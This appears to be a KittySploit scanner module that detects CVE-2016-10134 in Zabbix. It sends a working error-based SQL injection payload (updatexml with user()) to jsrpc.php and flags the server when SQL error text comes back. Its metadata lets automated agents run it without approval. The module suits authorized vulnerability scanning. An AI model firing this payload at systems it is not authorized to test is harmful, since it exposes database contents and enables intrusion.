#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zabbix before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zabbix - SQL Injection Detection',
        'description': 'Zabbix before 2.2.14 and 3.0 before 3.0.4 allows remote attackers to execute arbitrary SQL commands via the toggle_ids array parameter in latest.php and perform SQL injection attacks.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'zabbix', 'sqli', 'vulhub', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-10134',
            'https://support.zabbix.com/browse/ZBX-11023',
            'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=850936',
            'http://www.debian.org/security/2017/dsa-3802',
        ],
        'cve': 'CVE-2016-10134',
    }

    def run(self):
        r = self.http_request(method="GET", path='/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Error in query [INSERT INTO profiles (profileid, userid', 'You have an error in your SQL syntax',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Zabbix - SQL Injection detected",
                path='/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::',
            )
            return True
        return False

